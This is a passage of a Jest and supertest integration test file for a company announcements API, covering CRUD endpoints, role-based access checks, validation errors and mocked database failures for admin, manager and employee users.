const request = require('supertest');
const app = require('../../server');
const db = require('../../src/config/database');
const User = require('../../src/models/User');
const Announcement = require('../../src/models/Announcement');

describe('Company Announcements System Integration Tests', () => {
  let adminToken, employeeToken, managerToken;
  let adminUser, employeeUser, managerUser;
  let testAnnouncement;

  beforeAll(async () => {
    // Setup test users
    adminUser = await User.create({
      username: 'admin_test',
      email: 'admin@test.com',
      password: 'password123',
      role: 'admin'
    });

    employeeUser = await User.create({
      username: 'employee_test',
      email: 'employee@test.com',
      password: 'password123',
      role: 'employee'
    });

    managerUser = await User.create({
      username: 'manager_test',
      email: 'manager@test.com',
      password: 'password123',
      role: 'manager'
    });

    // Generate tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'admin@test.com', password: 'password123' });
    adminToken = adminLogin.body.token;

    const employeeLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'employee@test.com', password: 'password123' });
    employeeToken = employeeLogin.body.token;

    const managerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'manager@test.com', password: 'password123' });
    managerToken = managerLogin.body.token;
  });

  afterAll(async () => {
    await Announcement.deleteMany({});
    await User.deleteMany({ username: { $in: ['admin_test', 'employee_test', 'manager_test'] } });
  });

  beforeEach(async () => {
    await Announcement.deleteMany({});
  });

  // TC-003: API endpoint tests - Happy Path and Error Path
  describe('[TC-003] API Endpoint Validation Tests', () => {
    describe('[TC-003] GET /api/announcements - Happy Path', () => {
      beforeEach(async () => {
        // Create test announcements for GET tests
        await Announcement.create({
          title: 'Test Announcement 1',
          content: 'First test announcement content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Test Announcement 2',
          content: 'Second test announcement content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-003-GET-HP] should return 200 with valid announcements array', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(2);
        expect(response.headers['content-type']).toMatch(/json/);
      });

      test('[TC-003-GET-HP] should return proper response structure with all required fields', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        response.body.forEach(announcement => {
          expect(announcement).toHaveProperty('_id');
          expect(announcement).toHaveProperty('title');
          expect(announcement).toHaveProperty('content');
          expect(announcement).toHaveProperty('created_at');
          expect(announcement).toHaveProperty('isActive');
          expect(announcement).toHaveProperty('createdBy');
        });
      });

      test('[TC-003-GET-HP] should return announcements in descending order by creation date', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        const announcements = response.body;
        
        for (let i = 0; i < announcements.length - 1; i++) {
          const current = new Date(announcements[i].created_at);
          const next = new Date(announcements[i + 1].created_at);
          expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
        }
      });

      test('[TC-003-GET-HP] should handle empty announcements list gracefully', async () => {
        await Announcement.deleteMany({});

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });

    describe('[TC-003] GET /api/announcements - Error Path', () => {
      test('[TC-003-GET-EP] should return 401 when no authorization header provided', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-003-GET-EP] should return 403 for invalid authorization token', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', 'Bearer invalid_token');

        expect(response.status).toBe(403);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-003-GET-EP] should return 401 for malformed authorization header', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', 'InvalidFormat token');

        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('Invalid authorization format');
      });

      test('[TC-003-GET-EP] should return 500 when database connection fails', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database connection failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toContain('Failed to fetch announcements');

        // Restore original method
        Announcement.find = originalFind;
      });
    });

    describe('[TC-003] POST /api/announcements - Happy Path', () => {
      test('[TC-003-POST-HP] should return 201 with created announcement data', async () => {
        const announcementData = {
          title: 'New API Test Announcement',
          content: 'This is a test announcement for API validation'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body).toHaveProperty('success', true);
        expect(response.body).toHaveProperty('data');
        expect(response.body.data).toHaveProperty('_id');
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.headers['content-type']).toMatch(/json/);
      });

      test('[TC-003-POST-HP] should auto-populate system fields correctly', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'System Fields Test',
            content: 'Testing system field population'
          });

        expect(response.status).toBe(201);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(response.body.data).toHaveProperty('created_at');
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });

      test('[TC-003-POST-HP] should handle unicode characters in announcement content', async () => {
        const unicodeData = {
          title: 'Unicode Test 🎉 测试',
          content: 'Content with émojis 🚀 and special characters: àáâãäåæçèéêë'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(unicodeData);

        expect(response.status).toBe(201);
        expect(response.body.data.title).toBe(unicodeData.title);
        expect(response.body.data.content).toBe(unicodeData.content);
      });
    });

    describe('[TC-003] POST /api/announcements - Error Path', () => {
      test('[TC-003-POST-EP] should return 400 when title is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ content: 'Content without title' });

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body).toHaveProperty('message');
        expect(response.body.message).toContain('title');
      });

      test('[TC-003-POST-EP] should return 400 when content is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Title without content' });

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body).toHaveProperty('message');
        expect(response.body.message).toContain('content');
      });

      test('[TC-003-POST-EP] should return 400 for empty request body', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({});

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('Validation errors');
      });

      test('[TC-003-POST-EP] should return 403 when non-admin user attempts creation', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Creation',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-POST-EP] should return 400 for invalid JSON payload', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .set('Content-Type', 'application/json')
          .send('{"title": "Invalid JSON", "content":}');

        expect(response.status).toBe(400);
      });

      test('[TC-003-POST-EP] should return 413 for oversized payload', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-003-POST-EP] should return 500 when database save fails', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('Failed to create announcement');

        // Restore original method
        Announcement.create = originalCreate;
      });
    });

    describe('[TC-003] PUT /api/announcements/:id - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-003-PUT-HP] should return 200 with updated announcement data', async () => {
        const updatedData = {
          title: 'Updated Title',
          content: 'Updated content with new information'
        };

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updatedData);

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('success', true);
        expect(response.body).toHaveProperty('data');
        expect(response.body.data.title).toBe(updatedData.title);
        expect(response.body.data.content).toBe(updatedData.content);
        expect(response.body.data._id).toBe(testAnnouncement._id.toString());
      });

      test('[TC-003-PUT-HP] should preserve system fields during update', async () => {
        const originalCreatedAt = testAnnouncement.created_at;
        const originalCreatedBy = testAnnouncement.createdBy;

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content'
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(originalCreatedBy.toString());
        expect(new Date(response.body.data.created_at).getTime()).toBe(originalCreatedAt.getTime());
      });

      test('[TC-003-PUT-HP] should handle partial updates correctly', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Only Title Updated'
          });

        expect(response.status).toBe(200);
        expect(response.body.data.title).toBe('Only Title Updated');
        expect(response.body.data.content).toBe('Original content');
      });
    });

    describe('[TC-003] PUT /api/announcements/:id - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Update',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-003-PUT-EP] should return 404 when announcement does not exist', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-003-PUT-EP] should return 400 for invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('message');
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-003-PUT-EP] should return 403 when non-admin user attempts update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-PUT-EP] should return 400 for empty update payload', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({});

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('No valid fields provided for update');
      });

      test('[TC-003-PUT-EP] should return 500 when database update fails', async () => {
        const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
        Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(500);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('Failed to update announcement');

        // Restore original method
        Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
      });
    });

    describe('[TC-003] DELETE /api/announcements/:id - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'This announcement will be deleted',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-003-DELETE-HP] should return 200 with success confirmation', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toHaveProperty('success', true);
        expect(response.body).toHaveProperty('message');
        expect(response.body.message).toContain('deleted successfully');
      });

      test('[TC-003-DELETE-HP] should verify announcement is actually deleted', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Verify deletion by trying to fetch
        const fetchResponse = await request(app)
          .get(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(fetchResponse.status).toBe(404);
      });

      test('[TC-003-DELETE-HP] should remove announcement from public listing immediately', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        const listResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(listResponse.status).toBe(200);
        expect(listResponse.body).toHaveLength(0);
      });
    });

    describe('[TC-003] DELETE /api/announcements/:id - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Delete',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-003-DELETE-EP] should return 404 when announcement does not exist', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-003-DELETE-EP] should return 400 for invalid ObjectId format', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('message');
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-003-DELETE-EP] should return 403 when non-admin user attempts deletion', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-DELETE-EP] should return 401 without authentication', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`);

        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Access token required');
      });

      test('[TC-003-DELETE-EP] should return 500 when database deletion fails', async () => {
        const originalFindByIdAndDelete = Announcement.findByIdAndDelete;
        Announcement.findByIdAndDelete = jest.fn().mockRejectedValue(new Error('Database deletion failed'));

        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(500);
        expect(response.body).toHaveProperty('success', false);
        expect(response.body.message).toContain('Failed to delete announcement');

        // Restore original method
        Announcement.findByIdAndDelete = originalFindByIdAndDelete;
      });
    });

    describe('[TC-003] GET /api/announcements/admin - Admin Endpoint Tests', () => {
      test('[TC-003-ADMIN-HP] should return 200 with admin view of announcements', async () => {
        await Announcement.create({
          title: 'Admin Test Announcement',
          content: 'Admin view test content',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(1);
        expect(response.headers['content-type']).toMatch(/json/);
      });

      test('[TC-003-ADMIN-EP] should return 403 when non-admin accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-003-ADMIN-EP] should return 401 without authentication', async () => {
        const response = await request(app)
          .get('/api/announcements/admin');

        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Access token required');
      });
    });

    describe('[TC-003] HTTP Method Validation', () => {
      test('[TC-003-METHOD-EP] should return 405 for unsupported HTTP methods', async () => {
        const response = await request(app)
          .patch('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(405);
      });

      test('[TC-003-METHOD-EP] should return 404 for non-existent endpoints', async () => {
        const response = await request(app)
          .get('/api/announcements/nonexistent')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(404);
      });
    });

    describe('[TC-003] Content-Type and Headers Validation', () => {
      test('[TC-003-HEADERS-HP] should accept application/json content-type', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .set('Content-Type', 'application/json')
          .send({
            title: 'JSON Content Type Test',
            content: 'Testing JSON content type'
          });

        expect(response.status).toBe(201);
      });

      test('[TC-003-HEADERS-EP] should handle missing content-type gracefully', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'No Content Type Test',
            content: 'Testing without explicit content type'
          });

        expect(response.status).toBe(201);
      });

      test('[TC-003-HEADERS-HP] should return proper response headers', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.headers).toHaveProperty('content-type');
        expect(response.headers['content-type']).toMatch(/application\/json/);
      });
    });

    describe('[TC-003] Rate Limiting and Request Validation', () => {
      test('[TC-003-RATE-EP] should handle rapid consecutive requests', async () => {
        const requests = Array.from({ length: 10 }, (_, i) =>
          request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${employeeToken}`)
        );

        const responses = await Promise.all(requests);
        
        // Most should succeed, but some might be rate limited
        const successfulResponses = responses.filter(r => r.status === 200);
        expect(successfulResponses.length).toBeGreaterThan(5);
      });

      test('[TC-003-CONCURRENT-HP] should handle concurrent API requests correctly', async () => {
        const concurrentRequests = [
          request(app).get('/api/announcements').set('Authorization', `Bearer ${employeeToken}`),
          request(app).get('/api/announcements').set('Authorization', `Bearer ${managerToken}`),
          request(app).get('/api/announcements/admin').set('Authorization', `Bearer ${adminToken}`)
        ];

        const responses = await Promise.all(concurrentRequests);
        
        expect(responses[0].status).toBe(200); // Employee request
        expect(responses[1].status).toBe(200); // Manager request  
        expect(responses[2].status).toBe(200); // Admin request
      });
    });
  });

  // TC-001: Announcement CRUD operations
  describe('[TC-001] Announcement CRUD Operations', () => {
    describe('[TC-001] CREATE Operation - Happy Path', () => {
      test('[TC-001-CREATE-HP] should successfully create announcement with valid data', async () => {
        const announcementData = {
          title: 'Test Announcement',
          content: 'This is a test announcement content'
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(announcementData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data).toHaveProperty('_id');
        expect(response.body.data.title).toBe(announcementData.title);
        expect(response.body.data.content).toBe(announcementData.content);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(response.body.data).toHaveProperty('created_at');
      });

      test('[TC-001-CREATE-HP] should auto-populate system fields correctly', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'System Fields Test',
            content: 'Testing auto-population of system fields'
          });

        expect(response.status).toBe(201);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(response.body.data.isActive).toBe(true);
        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
      });
    });

    describe('[TC-001] CREATE Operation - Error Path', () => {
      test('[TC-001-CREATE-EP] should fail when title is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ content: 'Content without title' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('title');
      });

      test('[TC-001-CREATE-EP] should fail when content is missing', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Title without content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('content');
      });

      test('[TC-001-CREATE-EP] should fail with empty title', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-CREATE-EP] should fail when non-admin user attempts creation', async () => {
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Unauthorized Creation',
            content: 'Should not be allowed'
          });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-CREATE-EP] should handle database connection failures', async () => {
        const originalCreate = Announcement.create;
        Announcement.create = jest.fn().mockRejectedValue(new Error('Database connection failed'));

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Test Announcement',
            content: 'Test content'
          });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to create announcement');

        // Restore original method
        Announcement.create = originalCreate;
      });
    });

    describe('[TC-001] READ Operation - Happy Path', () => {
      beforeEach(async () => {
        // Create test announcements
        testAnnouncement = await Announcement.create({
          title: 'Test Read Announcement',
          content: 'Test read content',
          createdBy: adminUser._id,
          isActive: true
        });

        await Announcement.create({
          title: 'Second Announcement',
          content: 'Second content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-READ-HP] should retrieve all active announcements for employees', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body).toHaveLength(2);
        
        response.body.forEach(announcement => {
          expect(announcement).toHaveProperty('_id');
          expect(announcement).toHaveProperty('title');
          expect(announcement).toHaveProperty('content');
          expect(announcement).toHaveProperty('created_at');
          expect(announcement.isActive).toBe(true);
        });
      });

      test('[TC-001-READ-HP] should retrieve all announcements for admin', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(Array.isArray(response.body)).toBe(true);
        expect(response.body.length).toBeGreaterThanOrEqual(2);
      });

      test('[TC-001-READ-HP] should sort announcements by creation date (newest first)', async () => {
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        const announcements = response.body;
        
        for (let i = 0; i < announcements.length - 1; i++) {
          const current = new Date(announcements[i].created_at);
          const next = new Date(announcements[i + 1].created_at);
          expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
        }
      });

      test('[TC-001-READ-HP] should return empty array when no announcements exist', async () => {
        await Announcement.deleteMany({});

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(200);
        expect(response.body).toEqual([]);
      });
    });

    describe('[TC-001] READ Operation - Error Path', () => {
      test('[TC-001-READ-EP] should fail when unauthorized user accesses admin endpoint', async () => {
        const response = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-READ-EP] should handle database query failures', async () => {
        const originalFind = Announcement.find;
        Announcement.find = jest.fn().mockReturnValue({
          populate: jest.fn().mockReturnValue({
            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
          })
        });

        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(500);
        expect(response.body.error).toContain('Failed to fetch announcements');

        // Restore original method
        Announcement.find = originalFind;
      });

      test('[TC-001-READ-EP] should fail without authentication token', async () => {
        const response = await request(app)
          .get('/api/announcements');

        expect(response.status).toBe(401);
        expect(response.body.error).toBe('Access token required');
      });
    });

    describe('[TC-001] UPDATE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Original Title',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-HP] should successfully update announcement title and content', async () => {
        const updatedData = {
          title: 'Updated Title',
          content: 'Updated content with new information'
        };

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send(updatedData);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(updatedData.title);
        expect(response.body.data.content).toBe(updatedData.content);
        expect(response.body.data._id).toBe(testAnnouncement._id.toString());
      });

      test('[TC-001-UPDATE-HP] should preserve system fields during update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated Title',
            content: 'Updated content',
            createdBy: employeeUser._id, // Attempt to change system field
            created_at: new Date('2020-01-01') // Attempt to change system field
          });

        expect(response.status).toBe(200);
        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
        expect(new Date(response.body.data.created_at)).not.toEqual(new Date('2020-01-01'));
      });

      test('[TC-001-UPDATE-HP] should reflect changes immediately to all users', async () => {
        await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Immediately Updated',
            content: 'Should be visible immediately'
          });

        const employeeResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(employeeResponse.body[0].title).toBe('Immediately Updated');
      });
    });

    describe('[TC-001] UPDATE Operation - Error Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'Test Update',
          content: 'Test content',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-UPDATE-EP] should fail when announcement does not exist', async () => {
        const response = await request(app)
          .put('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('not found');
      });

      test('[TC-001-UPDATE-EP] should fail with invalid ObjectId format', async () => {
        const response = await request(app)
          .put('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-001-UPDATE-EP] should fail when non-admin user attempts update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });

      test('[TC-001-UPDATE-EP] should handle database update failures', async () => {
        const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
        Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated', content: 'Updated content' });

        expect(response.status).toBe(500);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Failed to update announcement');

        // Restore original method
        Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
      });

      test('[TC-001-UPDATE-EP] should fail with empty title update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: '', content: 'Valid content' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });

      test('[TC-001-UPDATE-EP] should fail with empty content update', async () => {
        const response = await request(app)
          .put(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Valid title', content: '' });

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
      });
    });

    describe('[TC-001] DELETE Operation - Happy Path', () => {
      beforeEach(async () => {
        testAnnouncement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'This announcement will be deleted',
          createdBy: adminUser._id,
          isActive: true
        });
      });

      test('[TC-001-DELETE-HP] should successfully delete announcement', async () => {
        const response = await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.message).toContain('deleted successfully');
      });

      test('[TC-001-DELETE-HP] should remove announcement from all user views immediately', async () => {
        await request(app)
          .delete(`/api/announcements/${testAnnouncement._id}`)
